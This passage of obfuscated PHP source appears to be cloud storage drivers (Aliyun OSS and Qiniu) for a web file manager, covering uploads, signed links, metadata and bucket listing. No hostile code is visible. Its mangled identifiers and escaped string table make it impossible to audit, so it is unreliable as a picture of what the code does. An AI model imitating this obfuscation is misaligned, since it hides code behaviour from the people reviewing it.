{ return $€è²’ÌÎ[1416]; } if ($ŸÄ”é±ş == $€è²’ÌÎ[1418]) { return $€è²’ÌÎ[556]; } return $ŸÄ”é±ş; } private function chmodPath($ÅÉÕªÂ®, $òòîÂ¤´ = '') { $©¾¶ÍïÑ =& $_SERVER[ĞÂ¤àÓï]; $Ã²Ÿ³õ = empty($òòîÂ¤´) ? $©¾¶ÍïÑ[1418] : $òòîÂ¤´; $ŠğéÀÍã = array($©¾¶ÍïÑ[37], $©¾¶ÍïÑ[198], $©¾¶ÍïÑ[1417], $©¾¶ÍïÑ[1418]); if (!in_array($Ã²Ÿ³õ, $ŠğéÀÍã)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÅÉÕªÂ®), $Ã²Ÿ³õ); } catch (OSS\Core\OssException $ÔÃô§©) { return !1; } return !0; } public function getContent($Ñ‰‹„İ­) { return $this->fileSubstr($Ñ‰‹„İ­, -1); } public function setContent($ªŸÂéäè, $‹¡Šúä® = '') { $Ú–âÙÍŞ =& $_SERVER[ĞÂ¤àÓï]; try { $Çİî˜Ë¸ = $this->trafficLimit($Ú–âÙÍŞ[1419]); $³ßÀÅëÒ = $this->client->putObject($this->bucket, $this->pathEncode($ªŸÂéäè), $‹¡Šúä®, $Çİî˜Ë¸); } catch (OSS\Core\OssException $ÙÜ¼çêƒ) { return !1; } $«¹åêÑ® = array($Ú–âÙÍŞ[1409] => trim($³ßÀÅëÒ[$Ú–âÙÍŞ[1420]], $Ú–âÙÍŞ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ªŸÂéäè))); $this->updateObjMeta($ªŸÂéäè, $«¹åêÑ®); return isset($³ßÀÅëÒ[$Ú–âÙÍŞ[1421]][$Ú–âÙÍŞ[1367]]) ? !0 : !1; } private function updateObjMeta($ıˆµÍç•, $àş‘×µà) { $ıˆµÍç• = $this->pathEncode($ıˆµÍç•); try { $ª—¹˜ = array(OSS\OssClient::OSS_HEADERS => $àş‘×µà); $this->client->copyObject($this->bucket, $ıˆµÍç•, $this->bucket, $ıˆµÍç•, $ª—¹˜); } catch (OSS\Core\OssException $öÙÏæ¼©) { return !1; } return !0; } public function upload($¥Êßåœ×, $“Üœñ§æ, $ªÆáÈÌ‘ = false, $¡«ƒ¢ì› = REPEAT_REPLACE) { $öè©±™ =& $_SERVER[ĞÂ¤àÓï]; $««¯‘Ìƒ = trim($¥Êßåœ×, $öè©±™[8]); $ÒÓäª—ğ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($öè©±™[1409] => @md5_file($“Üœñ§æ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¥Êßåœ×))); $ÒÓäª—ğ = $this->trafficLimit($öè©±™[1419], $ÒÓäª—ğ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($««¯‘Ìƒ), $“Üœñ§æ, $ÒÓäª—ğ); } catch (OSS\Core\OssException $Ú·µøø„) { return !1; } return $this->getPathOuter($¥Êßåœ×); } public function getHost() { $ä¨ş“» =& $_SERVER[ĞÂ¤àÓï]; $¹•ëÊôç = explode($ä¨ş“»[183], parent::getHost()); return $¹•ëÊôç[0] . $ä¨ş“»[183] . $this->bucket . $ä¨ş“»[10] . $¹•ëÊôç[1]; } public function uploadFormData($ü¾ÉÄ±¾, $×¥ºô‰ğ = 3600) { $ñ¯Úµ½Œ =& $_SERVER[ĞÂ¤àÓï]; if (!($À™êêÚ = $this->getHost())) { return !1; } $õÅçßŒÓ = $×¥ºô‰ğ; $ûß·Ğ ¢ = date($ñ¯Úµ½Œ[1422], time() + $õÅçßŒÓ); $¸š×…ğ = new DateTime($ûß·Ğ ¢); $ß‰÷«‰Æ = $¸š×…ğ->format(DateTime::ISO8601); $½ìæè¾Ğ = strpos($ß‰÷«‰Æ, $ñ¯Úµ½Œ[296]); $ß‰÷«‰Æ = substr($ß‰÷«‰Æ, 0, $½ìæè¾Ğ) . $ñ¯Úµ½Œ[1423]; $ĞúèÀ€é = 1048576000 * 5; $êÎìÌÁ = $this->pathFather($ü¾ÉÄ±¾); $ˆ ‹™¦Â = array($ñ¯Úµ½Œ[1321] => $ß‰÷«‰Æ, $ñ¯Úµ½Œ[1322] => array(array($ñ¯Úµ½Œ[1424], 0, $ĞúèÀ€é), array($ñ¯Úµ½Œ[1325], $ñ¯Úµ½Œ[1326], $êÎìÌÁ))); $ğäıçµ¡ = base64_encode(json_encode($ˆ ‹™¦Â)); $ÆŠàÏİß = base64_encode(hash_hmac($ñ¯Úµ½Œ[232], $ğäıçµ¡, $this->secret, !0)); $ô¸ı¦ı± = array($ñ¯Úµ½Œ[1331] => $ğäıçµ¡, $ñ¯Úµ½Œ[1425] => $this->accessKey, $ñ¯Úµ½Œ[1327] => $ñ¯Úµ½Œ[1319], $ñ¯Úµ½Œ[1426] => $ÆŠàÏİß, $ñ¯Úµ½Œ[181] => $À™êêÚ); $ô¸ı¦ı± = $this->trafficLimit($ñ¯Úµ½Œ[1419], $ô¸ı¦ı±); return $ô¸ı¦ı±; } public function multiUploadFormData($¸Ò°ü©Œ, $•—»ˆû = 3600) { $È¸­§§Ê =& $_SERVER[ĞÂ¤àÓï]; if (!($§Òë¼¡ = $this->getHost())) { return !1; } $İ¯ò¬ = $this->trafficLimit($È¸­§§Ê[1419]); $ğêµ½‰î = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¸Ò°ü©Œ), $İ¯ò¬); return array($È¸­§§Ê[223] => $ğêµ½‰î, $È¸­§§Ê[181] => $§Òë¼¡ . $È¸­§§Ê[8] . $this->pathEncode($¸Ò°ü©Œ), $È¸­§§Ê[224] => gmdate($È¸­§§Ê[1427]), $È¸­§§Ê[94] => $¸Ò°ü©Œ); } public function multiUploadAuthData($®åš¿ã˜, $’Î¡½¹¸ = array()) { $¹ÙÍÆ× =& $_SERVER[ĞÂ¤àÓï]; $Ü›Ğ©¯® = isset($’Î¡½¹¸[$¹ÙÍÆ×[224]]) ? $’Î¡½¹¸[$¹ÙÍÆ×[224]] : gmdate($¹ÙÍÆ×[1427]); $«åËÙ½ = isset($’Î¡½¹¸[$¹ÙÍÆ×[174]]) ? $’Î¡½¹¸[$¹ÙÍÆ×[174]] : $¹ÙÍÆ×[12]; $ˆí¿Ø€¡ = $®åš¿ã˜; if (isset($’Î¡½¹¸[$¹ÙÍÆ×[94]])) { $ˆí¿Ø€¡ = $’Î¡½¹¸[$¹ÙÍÆ×[94]]; unset($’Î¡½¹¸[$¹ÙÍÆ×[94]]); } if (isset($’Î¡½¹¸[$¹ÙÍÆ×[225]])) { $’Î¡½¹¸[$¹ÙÍÆ×[224]] = $Ü›Ğ©¯®; return $this->listUploadParts($ˆí¿Ø€¡, $’Î¡½¹¸); } $ù’Ïñ•’ = array($¹ÙÍÆ×[226], $¹ÙÍÆ×[12], $¹ÙÍÆ×[120], $Ü›Ğ©¯®, "\170\x2d\x6f\163\x73\55\144\141\x74\x65\x3a{$Ü›Ğ©¯®}", $¹ÙÍÆ×[8] . $this->bucket . $¹ÙÍÆ×[8] . $ˆí¿Ø€¡ . $«åËÙ½); if (strpos($«åËÙ½, $¹ÙÍÆ×[227]) === 0) { $ù’Ïñ•’[0] = $¹ÙÍÆ×[228]; if ($˜á±÷Œ = $this->trafficLimit($¹ÙÍÆ×[1419])) { $ˆí¿Ø€¡ = $¹ÙÍÆ×[1428]; array_splice($ù’Ïñ•’, 5, 0, $ˆí¿Ø€¡ . $¹ÙÍÆ×[4] . $˜á±÷Œ[$ˆí¿Ø€¡]); } } if (isset($’Î¡½¹¸[$¹ÙÍÆ×[229]]) && $’Î¡½¹¸[$¹ÙÍÆ×[229]] == $¹ÙÍÆ×[230]) { $ù’Ïñ•’[0] = $¹ÙÍÆ×[230]; } if (!empty($’Î¡½¹¸[$¹ÙÍÆ×[1429]])) { $Í·Ä³ñ = array_merge(array($ù’Ïñ•’[4]), $’Î¡½¹¸[$¹ÙÍÆ×[1429]]); sort($Í·Ä³ñ); $ù’Ïñ•’[4] = implode($¹ÙÍÆ×[231], $Í·Ä³ñ); } $ã§è˜‘¡ = implode($¹ÙÍÆ×[231], $ù’Ïñ•’); $†êÆ÷äÑ = base64_encode(hash_hmac($¹ÙÍÆ×[232], $ã§è˜‘¡, $this->secret, !0)); $Û£óóµÎ = $¹ÙÍÆ×[1393] . $this->accessKey . $¹ÙÍÆ×[4] . $†êÆ÷äÑ; if (strpos($«åËÙ½, $¹ÙÍÆ×[227]) === 0) { $Û£óóµÎ = array($¹ÙÍÆ×[234] => $Û£óóµÎ, $¹ÙÍÆ×[224] => $Ü›Ğ©¯®); if ($˜á±÷Œ) { $Û£óóµÎ = array_merge($Û£óóµÎ, $˜á±÷Œ); } } return $Û£óóµÎ; } public function listUploadParts($æòÍÒˆÏ, $’†ĞŠ¢­) { $…ªÖ³Ñ… =& $_SERVER[ĞÂ¤àÓï]; $°µ½Ş¿¹ = parse_url_query($’†ĞŠ¢­[$…ªÖ³Ñ…[174]]); $±¿™ëå = $this->client->listParts($this->bucket, $this->pathEncode($æòÍÒˆÏ), $°µ½Ş¿¹[$…ªÖ³Ñ…[223]]); $ûÛ¦½‹ß = $±¿™ëå->getListPart(); $»¢àÔ = array(); foreach ($ûÛ¦½‹ß as $Éã«Œ) { $»¢àÔ[] = array($…ªÖ³Ñ…[1413] => $Éã«Œ->getPartNumber(), $…ªÖ³Ñ…[1414] => trim($Éã«Œ->getETag(), $…ªÖ³Ñ…[118])); } unset($’†ĞŠ¢­[$…ªÖ³Ñ…[225]], $’†ĞŠ¢­[$…ªÖ³Ñ…[229]]); $‡áŒôªö = $this->multiUploadAuthData($æòÍÒˆÏ, $’†ĞŠ¢­); if (empty($‡áŒôªö)) { return !1; } return array($…ªÖ³Ñ…[234] => $‡áŒôªö, $…ªÖ³Ñ…[224] => $’†ĞŠ¢­[$…ªÖ³Ñ…[224]], $…ªÖ³Ñ…[236] => $»¢àÔ); } public function download($‡Œá·æ , $øÚ˜«Â–) { if ($this->isFolder($‡Œá·æ )) { return !1; } try { $®îó¬œ× = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $øÚ˜«Â–); $®îó¬œ× = $this->trafficLimit($_SERVER[ĞÂ¤àÓï][109], $®îó¬œ×); $this->client->getObject($this->bucket, $this->pathEncode($‡Œá·æ ), $®îó¬œ×); } catch (OSS\Core\OssException $›ñÙÏÚ®) { return !1; } return $øÚ˜«Â–; } public function fileSubstr($ôŒê®•–, $„ Êæòú = 0, $ÌÏÃ§©İ = false) { if ($„ Êæòú === -1) { $åñ‹°åÉ = array(); } else { if ($ÌÏÃ§©İ === !1) { $§Ï™ş»È = $this->size($ôŒê®•–); } else { $§Ï™ş»È = $„ Êæòú + $ÌÏÃ§©İ - 1; } $åñ‹°åÉ = array(OSS\OssClient::OSS_RANGE => "{$„ Êæòú}\55{$§Ï™ş»È}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ôŒê®•–), $åñ‹°åÉ); } catch (OSS\Core\OssException $¢™äßÖ¤) { think_exception($¢™äßÖ¤->getMessage()); return !1; } } private function trafficLimit($ÇØÛ¬Áø, $ş´ûºÌ¤ = array()) { $¶Ã¬Ú«ƒ =& $_SERVER[ĞÂ¤àÓï]; if ($ÇØÛ¬Áø == $¶Ã¬Ú«ƒ[1419] && $this->isUploadServer() || $ÇØÛ¬Áø == $¶Ã¬Ú«ƒ[109] && $this->isFileOutServer()) { return $ş´ûºÌ¤; } $âßÙû¬¾ = floatval($GLOBALS[$¶Ã¬Ú«ƒ[6]][$¶Ã¬Ú«ƒ[89]][$¶Ã¬Ú«ƒ[107]][$ÇØÛ¬Áø]) * 1024 * 1024 * 8; if (!$âßÙû¬¾) { return $ş´ûºÌ¤; } $âßÙû¬¾ = $âßÙû¬¾ < 819200 ? 819200 : ($âßÙû¬¾ > 838860800 ? 838860800 : $âßÙû¬¾); $ş´ûºÌ¤[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($âßÙû¬¾); return $ş´ûºÌ¤; } public function link($¹°á¦±Á, $Í¢îÚ’ß = array()) { $ã–Ø¥ÀÖ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->exist($¹°á¦±Á) || $this->isFolder($¹°á¦±Á)) { return !1; } try { $Í¢îÚ’ß = $this->trafficLimit($ã–Ø¥ÀÖ[109], $Í¢îÚ’ß); $É±Ö“À‡ = $this->client->signUrl($this->bucket, $this->pathEncode($¹°á¦±Á), 3600 * 12, $ã–Ø¥ÀÖ[230], $Í¢îÚ’ß); return $this->getCdnLink($É±Ö“À‡); } catch (OSS\Core\OssException $·íô’¸›) { return !1; } } public function fileOut($´£ÑáÉŸ, $³²ù¨Ë³ = false, $ñç‡ªü€ = false, $ß õ€Ì² = '') { $şúê×­ê =& $_SERVER[ĞÂ¤àÓï]; if ($this->isFileOutServer()) { return $this->fileOutServer($´£ÑáÉŸ, $³²ù¨Ë³, $ñç‡ªü€, $ß õ€Ì²); } if (!$ñç‡ªü€) { $ñç‡ªü€ = $this->pathThis($´£ÑáÉŸ); } $ñç‡ªü€ = rawurlencode($ñç‡ªü€); $ÛÔµ§²š = get_file_mime(get_path_ext($ñç‡ªü€)); if ($ÛÔµ§²š == $şúê×­ê[217]) { return parent::fileOut($´£ÑáÉŸ, $³²ù¨Ë³, $ñç‡ªü€, $ß õ€Ì²); } $³²ù¨Ë³ = $³²ù¨Ë³ ? $şúê×­ê[1430] : $şúê×­ê[1431]; $Ş«¹„œ‰ = array(OSS\OssClient::OSS_SUB_RESOURCE => $şúê×­ê[1432] . rawurlencode("{$³²ù¨Ë³}\x3b\146\x69\x6c\145\156\x61\x6d\x65\75{$ñç‡ªü€}")); $Ş«¹„œ‰[OSS\OssClient::OSS_SUB_RESOURCE] .= $şúê×­ê[1433] . rawurlencode($ÛÔµ§²š); $éº£ê¾Õ = $this->link($´£ÑáÉŸ, $Ş«¹„œ‰); $this->fileOutLink($éº£ê¾Õ); } public function fileOutServer($×¸¢–ÓÊ, $­Ò·¦²Ü = false, $ÃÙİ‹ÎÅ = false, $˜ïï¨ó½ = '') { parent::fileOut($×¸¢–ÓÊ, $­Ò·¦²Ü, $ÃÙİ‹ÎÅ, $˜ïï¨ó½); } public function fileOutImage($™“îÙÃ³, $ºİ›îÌ‘ = 250) { $úÓÉÊ÷ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ĞÂ¤àÓï][1434] . $ºİ›îÌ‘); $²¬Ã•Ğ‹ = $this->link($™“îÙÃ³, $úÓÉÊ÷); $this->fileOutLink($²¬Ã•Ğ‹); } public function fileOutImageServer($Ö¥½×Úœ, $†ÒÃŞÃ = 250) { parent::fileOutImage($Ö¥½×Úœ, $†ÒÃŞÃ); } public function fileOutLink($šÉì ãÌ) { $µ‡ûÌ¥™ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->isCdnHost() && substr($šÉì ãÌ, 0, 7) == $µ‡ûÌ¥™[1334]) { $šÉì ãÌ = $µ‡ûÌ¥™[1335] . substr($šÉì ãÌ, 7); } header($µ‡ûÌ¥™[161] . $šÉì ãÌ); die; } public function hashMd5($Ê¤ªìôÎ, $»á„úí¹ = '') { $÷³œßËè =& $_SERVER[ĞÂ¤àÓï]; $Åä»ó”ª = $this->_objectMeta($Ê¤ªìôÎ); if (!$Åä»ó”ª) { return $÷³œßËè[12]; } if (!isset($Åä»ó”ª[$÷³œßËè[1409]]) && !empty($»á„úí¹)) { $»×È²±º = $this->updateObjMeta($Ê¤ªìôÎ, array($÷³œßËè[1409] => $»á„úí¹)); $Åä»ó”ª[$÷³œßËè[1409]] = $»×È²±º ? $»á„úí¹ : $÷³œßËè[12]; } return isset($Åä»ó”ª[$÷³œßËè[1409]]) ? strtolower($Åä»ó”ª[$÷³œßËè[1409]]) : $÷³œßËè[12]; } public function size($ÆÆÀúâÌ) { $¿âï¾áò = $this->objectMeta($ÆÆÀúâÌ); return $¿âï¾áò ? $¿âï¾áò[$_SERVER[ĞÂ¤àÓï][76]] : 0; } public function info($ìÔ††¶—) { if ($this->isFolder($ìÔ††¶—)) { return $this->folderInfo($ìÔ††¶—); } else { if ($this->isFile($ìÔ††¶—)) { return $this->fileInfo($ìÔ††¶—); } } return !1; } public function exist($­Â×·ê·) { return $this->isFile($­Â×·ê·) || $this->isFolder($­Â×·ê·); } public function isFile($ÒÈ•) { return !$this->isFolder($ÒÈ•) && $this->objectMeta($ÒÈ•); } public function isFolder($¼ş¢äÏ) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][165], $¼ş¢äÏ); } protected function objectMeta($ıí˜ªÜŒ) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][167], $ıí˜ªÜŒ); } protected function _objectMeta($Ï· »×É) { $Ï§ğğĞÍ =& $_SERVER[ĞÂ¤àÓï]; try { $ëÏßî¢ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ï· »×É)); } catch (OSS\Core\OssException $°âóü€Õ) { $ëÏßî¢ = !1; } if ($ëÏßî¢) { $ëÏßî¢[$Ï§ğğĞÍ[76]] = intval($ëÏßî¢[$Ï§ğğĞÍ[1407]]); } return $ëÏßî¢; } protected function _isFolder($óî½ïÙâ) { $­áÉôˆ¤ =& $_SERVER[ĞÂ¤àÓï]; if ($óî½ïÙâ == $­áÉôˆ¤[12] || $óî½ïÙâ == $­áÉôˆ¤[8]) { return !0; } $ÇİñÖ“œ = array($­áÉôˆ¤[1403] => $­áÉôˆ¤[8], $­áÉôˆ¤[1404] => rtrim($óî½ïÙâ, $­áÉôˆ¤[8]) . $­áÉôˆ¤[8], $­áÉôˆ¤[1405] => 1, $­áÉôˆ¤[1406] => $­áÉôˆ¤[12]); $«‹‹ğ½’ = $this->client->listObjects($this->bucket, $ÇİñÖ“œ); if ($«‹‹ğ½’->getObjectList() || $«‹‹ğ½’->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($ãËÛˆò) { parent::__construct(); require_once SDK_DIR . $_SERVER[ĞÂ¤àÓï][1435]; $this->_init($ãËÛˆò); } public function _init($å­óô®†) { $¨í‘¢ğÂ =& $_SERVER[ĞÂ¤àÓï]; foreach ($å­óô®† as $¢…ùÜ¥à => $–Å°ôèò) { if (isset($this->{$¢…ùÜ¥à})) { $this->{$¢…ùÜ¥à} = $–Å°ôèò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¨í‘¢ğÂ[1436] . LNG($¨í‘¢ğÂ[1394])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($‰Ó¶³ü, $Ù°º¨˜‰ = '', $ÆîğÈÜ = REPEAT_RENAME) { if ($this->setContent($‰Ó¶³ü, $Ù°º¨˜‰)) { return $this->getPathOuter($‰Ó¶³ü); } return !1; } public function mkdir($ãÍ›„¼, $æšõœµŞ = REPEAT_SKIP) { $ı’‰Æãã =& $_SERVER[ĞÂ¤àÓï]; $µİ¸Õğ¢ = trim($ãÍ›„¼, $ı’‰Æãã[8]); if ($this->_isFolder($µİ¸Õğ¢)) { return $this->getPathOuter($µİ¸Õğ¢); } $ãÍ›„¼ = $µİ¸Õğ¢ . $ı’‰Æãã[8]; $³ˆ¸¨Ï = get_path_this($µİ¸Õğ¢); $³ºô¿ÑÜ = $ãÍ›„¼ . $³ˆ¸¨Ï; if (!$this->mkfile($³ºô¿ÑÜ)) { return !1; } if (!$this->moveFile($³ºô¿ÑÜ, $ãÍ›„¼)) { $this->delFile($³ºô¿ÑÜ); return !1; } return $this->getPathOuter($µİ¸Õğ¢); } public function copyFile($ •˜Ã¢‹, $ÇÕ‡ŞÕ¡) { $ñ²öÏù¶ = $this->bucketManager->copy($this->bucket, $ •˜Ã¢‹, $this->bucket, $ÇÕ‡ŞÕ¡, !0); return $ñ²öÏù¶ ? !1 : $this->getPathOuter($ÇÕ‡ŞÕ¡); } public function moveFile($”£µ•ÏÆ, $·ùƒ£Ã¦) { $ËÍùˆÀ› = $this->bucketManager->move($this->bucket, $”£µ•ÏÆ, $this->bucket, $·ùƒ£Ã¦, !0); return $ËÍùˆÀ› ? !1 : $this->getPathOuter($·ùƒ£Ã¦); } public function delFile($ĞòÚõİ¡) { if (!$this->exist($ĞòÚõİ¡)) { return !0; } $»ì÷òşå = $this->bucketManager->delete($this->bucket, $ĞòÚõİ¡); return $»ì÷òşå ? !1 : !0; } public function delFolder($Ò™Öš§Ğ) { $…–Ï‚Í³ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->exist($Ò™Öš§Ğ)) { return !0; } $this->listItemCache = !1; $­œÓªò¢ = $this->fileList($Ò™Öš§Ğ); $this->listItemCache = !0; $‚¶³°İª = trim($Ò™Öš§Ğ, $…–Ï‚Í³[8]) . $…–Ï‚Í³[8]; if (!empty($Ò™Öš§Ğ) && $Ò™Öš§Ğ !== $…–Ï‚Í³[197] && !in_array($‚¶³°İª, $­œÓªò¢[$…–Ï‚Í³[82]])) { $­œÓªò¢[$…–Ï‚Í³[82]][] = $‚¶³°İª; } $ĞøÜ‹ï = $this->delByBatch($­œÓªò¢[$…–Ï‚Í³[83]]); if (!$ĞøÜ‹ï) { return !1; } $ĞøÜ‹ï = $this->delByBatch($­œÓªò¢[$…–Ï‚Í³[82]]); if (!$ĞøÜ‹ï) { return !1; } return $this->delFile($‚¶³°İª); } private function delByBatch($ÚÁÉïÂ) { foreach (array_chunk($ÚÁÉïÂ, 1000) as $°Õ§¢­ê) { $ñá™†‡ = $this->bucketManager->buildBatchDelete($this->bucket, $°Õ§¢­ê); list($°¤ˆø²Î, $æû¯ì‹•) = $this->bucketManager->batch($ñá™†‡); if ($æû¯ì‹•) { return !1; } } return !0; } public function rename($£³Ú˜À´, $şˆÑØÇÊ) { return $this->renameObject($£³Ú˜À´, $şˆÑØÇÊ); } public function fileInfo($º ½°ç, $ –Š‹è¸ = false, $ğÀœÙÏù = array()) { $Ş“„·¿ä =& $_SERVER[ĞÂ¤àÓï]; $Öã—ü¨á = array($Ş“„·¿ä[32] => $this->pathThis($º ½°ç), $Ş“„·¿ä[84] => $this->getPathOuter($Ş“„·¿ä[8] . $º ½°ç), $Ş“„·¿ä[33] => $Ş“„·¿ä[199], $Ş“„·¿ä[76] => isset($ğÀœÙÏù[$Ş“„·¿ä[1437]]) ? $ğÀœÙÏù[$Ş“„·¿ä[1437]] : 0, $Ş“„·¿ä[174] => $this->ext($º ½°ç)); if ($ –Š‹è¸) { return $Öã—ü¨á; } $Öã—ü¨á[$Ş“„·¿ä[200]] = $Öã—ü¨á[$Ş“„·¿ä[85]] = 0; $Öã—ü¨á[$Ş“„·¿ä[201]] = $Öã—ü¨á[$Ş“„·¿ä[202]] = !0; if (empty($ğÀœÙÏù)) { $ğÀœÙÏù = $this->objectMeta($º ½°ç); if (!$ğÀœÙÏù) { return $Öã—ü¨á; } } if (isset($ğÀœÙÏù[$Ş“„·¿ä[1438]])) { $Öã—ü¨á[$Ş“„·¿ä[85]] = substr($ğÀœÙÏù[$Ş“„·¿ä[1438]] . $Ş“„·¿ä[12], 0, 10); } if (isset($ğÀœÙÏù[$Ş“„·¿ä[1437]])) { $Öã—ü¨á[$Ş“„·¿ä[76]] = $ğÀœÙÏù[$Ş“„·¿ä[1437]]; } return $Öã—ü¨á; } public function folderInfo($íÈïÔòŒ, $‹¸„„‡¡ = false) { $¬«§¨’ë =& $_SERVER[ĞÂ¤àÓï]; $óïñ«‘ = array($¬«§¨’ë[32] => $this->pathThis($íÈïÔòŒ), $¬«§¨’ë[84] => $this->getPathOuter($¬«§¨’ë[8] . $íÈïÔòŒ), $¬«§¨’ë[33] => $¬«§¨’ë[75]); if ($‹¸„„‡¡) { return $óïñ«‘; } $óïñ«‘[$¬«§¨’ë[200]] = $óïñ«‘[$¬«§¨’ë[85]] = 0; $óïñ«‘[$¬«§¨’ë[201]] = $óïñ«‘[$¬«§¨’ë[202]] = !0; $íÈïÔòŒ = rtrim($íÈïÔòŒ, $¬«§¨’ë[8]) . $¬«§¨’ë[8]; $‚ğµº›˜ = $this->objectMeta($íÈïÔòŒ); if (isset($‚ğµº›˜[$¬«§¨’ë[1438]])) { $óïñ«‘[$¬«§¨’ë[85]] = substr($‚ğµº›˜[$¬«§¨’ë[1438]] . $¬«§¨’ë[12], 0, 10); } return $óïñ«‘; } public function listPath($ôà”‹¬µ, $–Ò·öÓ = false) { $ÎùÁéá =& $_SERVER[ĞÂ¤àÓï]; $æğ»Ìïá = $this->fileList($ôà”‹¬µ, $ÎùÁéá[8], !0); foreach ($æğ»Ìïá[$ÎùÁéá[82]] as $ÄëĞ¢Û› => $øäÖŸˆ§) { $æğ»Ìïá[$ÎùÁéá[82]][$ÄëĞ¢Û›] = $this->folderInfo($øäÖŸˆ§, $–Ò·öÓ); } foreach ($æğ»Ìïá[$ÎùÁéá[83]] as $ÄëĞ¢Û› => $øäÖŸˆ§) { $æğ»Ìïá[$ÎùÁéá[83]][$ÄëĞ¢Û›] = $this->fileInfo($øäÖŸˆ§[$ÎùÁéá[94]], $–Ò·öÓ, $øäÖŸˆ§); } return $æğ»Ìïá; } public function has($³Ïøñ, $ÈƒÊòß = false, $´¿É‰òË = true) { $òÂñìÊ =& $_SERVER[ĞÂ¤àÓï]; $³Ïøñ = trim($³Ïøñ, $òÂñìÊ[8]); $¶§×Š ‡ = empty($³Ïøñ) && $³Ïøñ !== $òÂñìÊ[197] ? $òÂñìÊ[12] : $³Ïøñ . $òÂñìÊ[8]; $ñÎùâ § = $òÂñìÊ[12]; $ö¤÷Ä¼ = 500; $Í°„÷ˆ½ = $òÂñìÊ[8]; $ƒÔ¨áÃù = $½ÕÃşÑ = 0; while (!0) { check_abort(); list($£ãŒøÒ‹, $ÊÒèÃ°™) = $this->bucketManager->listFiles($this->bucket, $¶§×Š ‡, $ñÎùâ §, $ö¤÷Ä¼, $Í°„÷ˆ½); if ($ÊÒèÃ°™) { break; } $ñÎùâ § = array_key_exists($òÂñìÊ[1406], $£ãŒøÒ‹) ? $ñÎùâ § = $£ãŒøÒ‹[$òÂñìÊ[1439]] : $òÂñìÊ[12]; if ($ÈƒÊòß) { if (!empty($£ãŒøÒ‹[$òÂñìÊ[1440]])) { $ƒÔ¨áÃù += count($£ãŒøÒ‹[$òÂñìÊ[1440]]); } if (!empty($£ãŒøÒ‹[$òÂñìÊ[1441]])) { $½ÕÃşÑ += count($£ãŒøÒ‹[$òÂñìÊ[1441]]); } if ($ñÎùâ § === $òÂñìÊ[12]) { break; } continue; } if ($´¿É‰òË) { if (!empty($£ãŒøÒ‹[$òÂñìÊ[1440]])) { return !0; } } else { if (!empty($£ãŒøÒ‹[$òÂñìÊ[1441]])) { return !0; } } if ($ñÎùâ § === $òÂñìÊ[12]) { break; } } if ($ÈƒÊòß) { return array($òÂñìÊ[207] => $ƒÔ¨áÃù, $òÂñìÊ[208] => $½ÕÃşÑ); } return !1; } public function listAll($±éØôö™) { $‘«à¡† =& $_SERVER[ĞÂ¤àÓï]; $‚ …âëÃ = $this->fileList($±éØôö™, $‘«à¡†[12], !0); $ğÃì–² = array(); foreach ($‚ …âëÃ[$‘«à¡†[83]] as $ëø°´Ê) { $ğÃì–²[$ëø°´Ê[$‘«à¡†[94]]] = $ëø°´Ê[$‘«à¡†[76]]; } foreach ($‚ …âëÃ[$‘«à¡†[82]] as $ëø°´Ê) { if (is_string($ëø°´Ê)) { $ğÃì–²[$ëø°´Ê] = 0; } } return $this->listAllFiles($±éØôö™, array_keys($ğÃì–²), $ğÃì–²); } private function fileList($Ûì¿Ü¥³, $—Í½º» = '', $‘…ªÛ—» = 0) { $°Îëåı =& $_SERVER[ĞÂ¤àÓï]; $Ûì¿Ü¥³ = trim($Ûì¿Ü¥³, $°Îëåı[8]); $Œ¥üå¯  = empty($Ûì¿Ü¥³) && $Ûì¿Ü¥³ !== $°Îëåı[197] ? $°Îëåı[12] : $Ûì¿Ü¥³ . $°Îëåı[8]; $ÏŠ¥ñÛ = $°Îëåı[12]; $¥”Èğ¨Ø = 1000; $šüù›á† = $½â„¢¾Û = array(); while (!0) { check_abort(); list($¸û‰ØÊ, $œöÈï) = $this->bucketManager->listFiles($this->bucket, $Œ¥üå¯ , $ÏŠ¥ñÛ, $¥”Èğ¨Ø, $—Í½º»); if ($œöÈï) { break; } $ÏŠ¥ñÛ = array_key_exists($°Îëåı[1406], $¸û‰ØÊ) ? $ÏŠ¥ñÛ = $¸û‰ØÊ[$°Îëåı[1439]] : $°Îëåı[12]; $º©Ëıšê = isset($¸û‰ØÊ[$°Îëåı[1440]]) ? $¸û‰ØÊ[$°Îëåı[1440]] : array(); $“Ä”Íî• = isset($¸û‰ØÊ[$°Îëåı[1441]]) ? $¸û‰ØÊ[$°Îëåı[1441]] : array(); foreach ($º©Ëıšê as $€àİ»ç) { if ($€àİ»ç[$°Îëåı[94]] == $Œ¥üå¯ ) { continue; } $«¦„Äã = $€àİ»ç[$°Îëåı[94]]; $ˆ†İ« = $€àİ»ç[$°Îëåı[1437]]; $€àİ»ç[$°Îëåı[76]] = $ˆ†İ«; $¾ïÕ± = $ˆ†İ« == 0 && substr($«¦„Äã, 